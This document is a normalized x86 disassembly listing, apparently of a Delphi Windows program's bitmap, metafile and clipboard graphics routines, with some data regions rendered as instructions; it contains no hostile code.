push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4226a8
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4226a8
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4229af
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e34
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e34
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e34
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e34
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_422714
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_422714
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229b6
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40278c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_40278c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_40278c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40278c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4229b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4229dd
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_4229e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_422a34
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_422a8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_422a34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422ad5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403230
mov edi eax
mov eax esi
call sub_403230
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_422bf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f60
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422bf9
mov al 0x1
sub_422c28
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41979c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422c70
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c77
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_422c7c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_422cb0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41979c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422cfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d02
mov eax [ ebp - 0x4 ]
call sub_4032e8
retn
sub_422d2c
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
xor [ edi + 0x41 ] 0x0
dec eax
je r-xdata
popad
je r-xdata
and [ ebx ] dh
ror [ ebx + 0x4c2e8c6 ] cl
add ah al
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
mov al [ 0x422d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000422d ] dh
add [ eax ] al
add [ eax ] cl
push edx
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x2ef80040 ] bl
inc edx
add [ eax - 0x7fffbe8b ] bl
ja r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x2da00040 ] cl
inc edx
add [ eax ] al
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
push [ eax ]
add [ eax + 0x74 ] cl
inc ecx
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_422f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ea8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4032b8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x8 ]
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_422ea1
push [ fs : eax ]
add esp 0xfffffff0
call sub_40360c
sub_422dc4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_422ea1
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4032b8
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_422f44
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_422f44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ea8
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40405c
retn
add esp 0xfffffff0
call sub_40360c
sub_422f44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_422fc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404de0
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407ff8
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_40408c
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_40408c
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_417414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422fce
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_422fd8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_423056
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417570
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403238
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40429c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404444
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42305d
lea eax [ ebp - 0x8 ]
call sub_404038
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42308f
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x31480040 ] bl
inc edx
add [ ecx ] dl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
inc esi
outsd
jb r-xdata
psubsb mm5 [ esi ]
add eax 0x8f64fffe
add eax 0x0
popad
je r-xdata
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
add [ eax ] al
add [ eax ] al
mov eax eax
sub_4230c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_423174
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_423174
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_423174
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_423148
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032e8
mov eax [ esi + 0x8 ]
call sub_4032e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_423174
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_417414
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4231b8
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_417414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42321c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
call sub_4231dc
call sub_4231fc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42325c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42328c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403230
mov edx eax
mov eax [ ebx + 0xc ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417bf8
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_4232c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_403474
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4032e8
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034fc
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4034fc
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034e4
sub_42336c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_4233fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403230
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42344c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_42336c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_42336c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_417b14
mov edx ebx
mov eax esi
call sub_42336c
jmp r-xdata
pop esi
pop ebx
retn
sub_4234a8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4231dc
mov ecx esi
mov edx ebx
call sub_422f44
pop esi
pop ebx
pop ebp
retn 0x4
sub_4234cc
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4234f0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_423518
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42361f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40429c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_422fd8
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4235a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423626
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4235a6
mov eax [ ebp - 0x4 ]
call sub_4032e8
call sub_403a9c
call sub_403af0
mov eax [ ebx + 0xc ]
call sub_4032e8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423626
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034fc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_423630
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403238
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402bec
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_42368c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_423708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_423518
mov eax [ ebp - 0x8 ]
push eax
push sub_423630
push ebp
call sub_42368c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423784
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41f6dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_4237c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423834
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_423c94
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_423cfc
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_42385c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42383b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
add esp 0xfffffff0
call sub_40360c
sub_42383b
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42385c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_423a68
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420d88
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40360c
xor edx edx
push ebp
push sub_423a4b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423e10
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423df8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423df8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423e10
mov ecx eax
xor edx edx
xor eax eax
call sub_41613c
mov eax ebx
call sub_4042f8
test eax eax
jg r-xdata
